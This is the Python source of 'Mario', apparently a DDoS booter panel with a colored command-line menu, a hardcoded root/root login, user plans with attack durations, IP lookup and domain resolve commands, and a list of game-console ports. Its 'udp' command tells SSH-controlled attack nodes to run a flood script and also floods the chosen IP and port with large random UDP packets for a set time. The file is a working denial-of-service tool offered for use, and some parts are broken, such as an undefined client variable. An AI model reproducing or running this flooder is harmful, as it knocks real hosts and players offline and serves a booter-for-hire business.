#!/usr/bin/python
# -*- coding: utf-8 -*-

# imports
import json
import os
from colorama import Fore, init
import random
import colorama
import time
import sys
import socket
from sys import platform
import requests
import subprocess
import threading
import paramiko
import base64
import ctypes

# defines project path for use of reload
ProjectPath = (os.path.dirname(os.path.abspath(__file__)))


# clears the screen for windows and linux
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

with open('Node-1.json', 'r') as node1:
    node1 = json.load(node1)
    Node1_enabled = (node1["enabled"])
    Node1_IP = (node1["Node-1_IP"])
    Node1_Password = (node1["Node-1_Password"])
    Node1_Username = (node1["Node-1_Username"])

with open('Node-2.json', 'r') as node2:
    node2 = json.load(node2)
    Node2_enabled = (node2["enabled"])
    Node2_IP = (node2["Node-2_IP"])
    Node2_Password = (node2["Node-2_Password"])
    Node2_Username = (node2["Node-2_Username"])


# user settings
users = {
    "root": {
        "password": "root",
        "plan": "Owner",
        "duration": "300",
        "cooldown": "0",
    }
}

color = Fore.LIGHTRED_EX
errorcolor = Fore.RED
warningcolor = Fore.LIGHTRED_EX
attackcolor = Fore.LIGHTBLUE_EX
eventcolor = Fore.YELLOW

currentlyattacking = "false"

# Error message colorization
def error(message):
    print(f"{errorcolor}[ERROR] {Fore.LIGHTWHITE_EX}| {message}")


# Warning message colorization
def warning(message):
    print(f"{warningcolor}[WARNING] {Fore.LIGHTWHITE_EX}| {message}")


# Attack message colorization
def attack(message):
    print(f"{attackcolor}[ATTACK] {Fore.LIGHTWHITE_EX}| {message}")


# Event message colorization
def event(message):
    print(f"{eventcolor}[EVENT] {Fore.LIGHTWHITE_EX}| {message}")


# open connections
# NODE-1

servers = 0

if Node1_enabled:
    Node1 = paramiko.SSHClient()
    Node1.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    Node1.connect(Node1_IP, username=Node1_Username, password=Node1_Password)
    servers += 1
else:
    pass

if Node2_enabled:
    Node2 = paramiko.SSHClient()
    Node2.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    Node2.connect(Node2_IP, username=Node2_Username, password=Node2_Password)
    servers += 1
else:
    pass

# to add more servers you will need to create more if statements & jsons

version = 1.1

windowsize = "80,20"

if platform == "win32":
    import ctypes
    ctypes.windll.kernel32.SetConsoleTitleW(f"Mario | Version {version}")
    init(convert=True)
    cmd = 'mode ' + windowsize
    os.system(cmd)
    LF_FACESIZE = 32
    STD_OUTPUT_HANDLE = -11

    class COORD(ctypes.Structure):
        _fields_ = [("X", ctypes.c_short), ("Y", ctypes.c_short)]

    class CONSOLE_FONT_INFOEX(ctypes.Structure):
        _fields_ = [("cbSize", ctypes.c_ulong),
                    ("nFont", ctypes.c_ulong),
                    ("dwFontSize", COORD),
                    ("FontFamily", ctypes.c_uint),
                    ("FontWeight", ctypes.c_uint),
                    ("FaceName", ctypes.c_wchar * LF_FACESIZE)]

    font = CONSOLE_FONT_INFOEX()
    font.cbSize = ctypes.sizeof(CONSOLE_FONT_INFOEX)
    font.nFont = 12
    font.dwFontSize.X = 5
    font.dwFontSize.Y = 26
    font.FontFamily = 54
    font.FontWeight = 400
    font.FaceName = "Consolas"
    handle = ctypes.windll.kernel32.GetStdHandle(STD_OUTPUT_HANDLE)
    ctypes.windll.kernel32.SetCurrentConsoleFontEx(
        handle, ctypes.c_long(False), ctypes.pointer(font))

# Form validation.
def validate(form):
    if len(form) > 0:
        return False
    return True


# Login authorization
def loginauth(username, password):
    if username in users:
        if password == users[username]["password"]:
            username = username
            print(Fore.GREEN + "Login successful")
            if platform == "win32":
                import ctypes
                ctypes.windll.kernel32.SetConsoleTitleW(f"Mario | Version {version} | Logged in as: {username} | Servers [{servers}]")
            load(username)
            ideal()
            return True
    return False


debugging = False


# Login event
def login():
    while True:
        if debugging == True:
            username = "root"
        else:
            username = input(color + "Username: ")

        if not len(username) > 0:
            print(Fore.RED + "Username can't be blank")
        else:
            break
    while True:
        if debugging == True:
            password = "root"
        else:
            password = input(color + "Password: ")

        if not len(password) > 0:
            print(Fore.RED + "Password can't be blank")
        else:
            break

    if loginauth(username, password):
        return
    else:
        print(Fore.RED + "Invalid username or password")
        time.sleep(2)
        clear()
        onlaunch()


# Operating system check
if platform == "linux" or platform == "linux2":
    init(convert=False)

# Reload full project
def logout():
    clear()
    banner()
    login()


# APIS
p = requests.post('http://ip-api.com/json/' + "1.1.1.1")
if '"status":"success"' in p.text:
    APIConnection = True
else:
    APIConnection = False


# Load sequence
def load(username):
    print("")
    event(f"{Fore.LIGHTWHITE_EX}Connection secure to Linux Servers...")
    event(f"{Fore.LIGHTWHITE_EX}Checking settings...")
    time.sleep(0.10)
    if APIConnection:
        event(f"{Fore.LIGHTWHITE_EX}API: {Fore.GREEN}Connected")
    else:
        event(f"{Fore.LIGHTWHITE_EX}API: {Fore.RED}Disconnected")
    time.sleep(0.10)
    event(f"{Fore.LIGHTWHITE_EX}Plan: " + users[username]["plan"])
    time.sleep(0.10)
    event(f"{Fore.LIGHTWHITE_EX}Max duration: " + users[username]["duration"])
    time.sleep(0.15)
    event(f"{Fore.LIGHTWHITE_EX}Cooldown: " + users[username]["cooldown"])
    time.sleep(0.10)
    warning("Sharing access is not prohibited.")
    warning("Do NOT share your credentials.")
    warning("Do NOT attack government & or education domains.")


# onlaunch events
def onlaunch():
    clear()
    banner()
    login()


# Ascii banner evaluator
def banner():
    clear()
    print(f"""
                                ╔{Fore.LIGHTWHITE_EX}╦{color}╗{Fore.LIGHTWHITE_EX}╔{color}═{Fore.LIGHTWHITE_EX}╗╦{color}═{Fore.LIGHTWHITE_EX}╗{color}╦{Fore.LIGHTWHITE_EX}╔═{color}╗
                                {color}║{Fore.LIGHTWHITE_EX}║{color}║{Fore.LIGHTWHITE_EX}╠{color}═{Fore.LIGHTWHITE_EX}╣{color}╠{Fore.LIGHTWHITE_EX}╦{color}╝║{Fore.LIGHTWHITE_EX}║ {color}║
                                ╩ {Fore.LIGHTWHITE_EX}╩{Fore.LIGHTWHITE_EX}╩ {color}╩╩{Fore.LIGHTWHITE_EX}╚═{color}╩╚═{Fore.LIGHTWHITE_EX}╝
""")


# waiting for a command aka idling
def ideal():
    global command, currentlyattacking
    for username in users:
        print("")
        commandline = (color + username + "@Mario:~$ ")
        command = input(commandline)

    # help command
    if command.lower() == "help":
        print(f"{color}  ┌────────────────────────────────────────────┐")
        print(f"{color}  │ {Fore.LIGHTWHITE_EX}                   HELP                    {color}│")
        print(f"{color}  ┝────────────────────────────────────────────┥")
        print(f"{color}  │ {color}METHODS  {Fore.WHITE}| {color}Shows a list of methods         {color}│")
        print(f"{color}  │ {Fore.LIGHTWHITE_EX}PORTS    {Fore.WHITE}| {Fore.LIGHTWHITE_EX}List of all ports               {color}│")
      #  print(f"{color}  │ {color}STATUS   {Fore.WHITE}| {color}View status of servers          {color}│")
        print(f"{color}  │ {color}IPLOOKUP {Fore.WHITE}| {color}Searches an IP for details      {color}│")
        print(f"{color}  │ {Fore.LIGHTWHITE_EX}RESOLVE  {Fore.WHITE}| {Fore.LIGHTWHITE_EX}Shows the ip of a domain        {color}│")
     #   print(f"{color}  │ {Fore.LIGHTWHITE_EX}STOP     {Fore.WHITE}| {Fore.LIGHTWHITE_EX}Stop all running attacks        {color}│")
        print(f"{color}  │ {color}LOGOUT   {Fore.WHITE}| {color}Log out of Mario                {color}│")
        print(f"{color}  │ {Fore.LIGHTWHITE_EX}CLS      {Fore.WHITE}| {Fore.LIGHTWHITE_EX}Clears the screen               {color}│")
        print(f"{color}  └────────────────────────────────────────────┘")

       # print(f"{color}  ┝─────────────────────────────────┰──────────┘")
   #     print(f"{color}  │{Fore.LIGHTWHITE_EX} All commands must be lowercase! {color}│")
        #print(f"{color}  └─────────────────────────────────┘")
        ideal()

    # methods command
    if command.lower() == "methods":
        print(f"{color}  ┌────────────────────────────────────────────┐")
        print(f"{color}  │ {Fore.LIGHTWHITE_EX}                  METHODS                  {color}│")
        print(f"{color}  ┝────────────────────────────────────────────┥")
        print(f"{color}  │ {Fore.LIGHTWHITE_EX}UDP | Floods a chosen IP address with UDP {color} │")
        print(f"{color}  ┝─────────────────────────────────┰──────────┘")
        print(f"{color}  │{Fore.LIGHTWHITE_EX} All commands must be lowercase! {color}│")
        print(f"{color}  └─────────────────────────────────┘")
        ideal()

    # ports command
    if command.lower() == "ports":
        print(f"{color}  ┌──────────────────────┐")
        print(f"{color}  │ {Fore.LIGHTWHITE_EX}        PORTS {color}       │")
        print(f"{color}  ┝──────────────────────┥")
        print(f"{color}  │ {Fore.LIGHTWHITE_EX}21   | SFTP {color}         │")
        print(f"{color}  │ {Fore.LIGHTWHITE_EX}22   | SSH {color}          │")
        print(f"{color}  │ {Fore.LIGHTWHITE_EX}23   | TELNET {color}       │")
        print(f"{color}  │ {Fore.LIGHTWHITE_EX}25   | SMTP {color}         │")
        print(f"{color}  │ {Fore.LIGHTWHITE_EX}53   | DNS {color}          │")
        print(f"{color}  │ {Fore.LIGHTWHITE_EX}69   | TFTP {color}         │")
        print(f"{color}  │ {Fore.LIGHTWHITE_EX}80   | HTTP {color}         │")
        print(f"{color}  │ {Fore.LIGHTWHITE_EX}443  | HTTPS {color}        │")
        print(f"{color}  │ {Fore.LIGHTWHITE_EX}3074 | XBOX {color}         │")
        print(f"{color}  │ {Fore.LIGHTWHITE_EX}9307 | PLAYSTATION {color}  │")
        print(f"{color}  └──────────────────────┘")
        ideal()

    # status command
    if command.lower() == "status":
        print("The logic behind this command is disabled.")
        print(f"{color}  ┌───────────────────────────────────┐")
        print(f"{color}  │          {Fore.LIGHTWHITE_EX}SERVER IS ONLINE         {color}│")
        print(f"{color}  └───────────────────────────────────┘")
   # else:
        #print(f"{color}  ┌───────────────────────────────────┐")
        #print(f"{color}  │         {Fore.LIGHTWHITE_EX}SERVER IS OFFLINE         {color}│")
        #print(f"{color}  └───────────────────────────────────┘")
       # ideal()

    # status command
    if command.lower() == "iplookup":
        ip = str(input("ip: "))
        p = requests.post('http://ip-api.com/json/' + ip)
        if '"status":"success"' in p.text:
            print(f"┌────────────────────────────────────")
            print(f"│       {Fore.LIGHTWHITE_EX}IPLOOKUP {Fore.WHITE}| {Fore.LIGHTWHITE_EX}{ip}         {color}")
            print(f"┝────────────────────────────────────")
            print(f"│ {Fore.LIGHTWHITE_EX}Country {Fore.WHITE}| {Fore.LIGHTWHITE_EX}{p.json()['country']} {color}")
            print(f"│ {Fore.LIGHTWHITE_EX}Country Code {Fore.WHITE}| {Fore.LIGHTWHITE_EX}{p.json()['countryCode']}  {color}")
            print(f"│ {Fore.LIGHTWHITE_EX}Region Name {Fore.WHITE}| {Fore.LIGHTWHITE_EX}{p.json()['region']} {color}")
            print(f"│ {Fore.LIGHTWHITE_EX}City {Fore.WHITE}| {Fore.LIGHTWHITE_EX}{p.json()['regionName']}  {color}")
            print(f"│ {Fore.LIGHTWHITE_EX}Timezone {Fore.WHITE}| {Fore.LIGHTWHITE_EX}{p.json()['city']}   {color}")
            print(f"│ {Fore.LIGHTWHITE_EX}Zip {Fore.WHITE}| {Fore.LIGHTWHITE_EX}{p.json()['zip']}   {color}")
            print(f"│ {Fore.LIGHTWHITE_EX}ISP {Fore.WHITE}| {Fore.LIGHTWHITE_EX}{p.json()['isp']}  {color}")
            print(f"└───────────────────────────────────")
        else:
            warning(f"{Fore.LIGHTRED_EX} IP Address could not be found.")
        ideal()

    # status command
    if command.lower() == "resolve":
        hostname = str(input("domain: "))
        try:
            ip = socket.gethostbyname(hostname)
            print(f"┌────────────────────────────────────")
            print(f"│    {Fore.LIGHTWHITE_EX}RESOLVE {Fore.WHITE}| {Fore.LIGHTWHITE_EX}{hostname}{color}")
            print(f"┝────────────────────────────────────")
            print(f"│ {Fore.LIGHTWHITE_EX}{hostname} {Fore.WHITE}| {Fore.LIGHTWHITE_EX}{ip}{color}")
            print(f"└───────────────────────────────────")
        except socket.gaierror:
            warning(f"{Fore.LIGHTRED_EX} Domain could not be found.")
        ideal()

    # cls command
    if command.lower() == "cls":
        banner()
        ideal()

    # udp command BROKEN, CURRENTLYATTACKING DOES NOT CHANGE WHEN TIMER HAS ENDED.
    if command.lower() == "udp":
        ip = str(input("ip: "))
        port = int(input("port: "))
        dur = int(input("duration: "))
        randport = (True, False)[port == 0]
        clock = (lambda: 0, time.process_time)[dur > 0]
        duration = (1, (clock() + dur))[dur > 0]
        if dur == 0:
            dur = 9999999
        Node1.exec_command('cd /root/Mario/')
        Node1.exec_command('python3 udp.py ' + ip + " " + str(port) + " " + str(dur))
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(35000)
        t_end = time.time() + dur
        print("")
        attack(f'UDP Flooding %s:%s for %s seconds' % (ip, port, dur or 'infinite'))
        print('type "stop" at any time.')
        while True:
            port = (random.randint(1, 15000000), port)[randport]
            while time.time() < t_end:
                sock.sendto(bytes, (ip, port))
            else:
                break
        print("")
        attack('Attack Finished.')
        ideal()

    # logout command
    if command.lower() == "logout":
        event(f"{Fore.GREEN}Disconnecting from server.")
        client.close()
        event(f"{Fore.GREEN}Successfully logged out.")
        time.sleep(1)
        logout()

    # stop command
   # if command.lower() == "stop":
   #     if currentlyattacking == "true":
   #         event(f"{Fore.GREEN}Stopping all running attacks.")
   #         client.exec_command(chr(3))
   #     else:
   #         error("There currently no attacks running.")
   #     ideal()

   # if command.lower() == "check":
   #     print(currentlyattacking)
   #     ideal()

    else:
        error(f"{Fore.LIGHTWHITE_EX}Unknown command, type 'help' for a list of commands.")
        warning(f"{Fore.LIGHTWHITE_EX}All commands must be lowercase.")
        ideal()


# Start Mario
onlaunch()
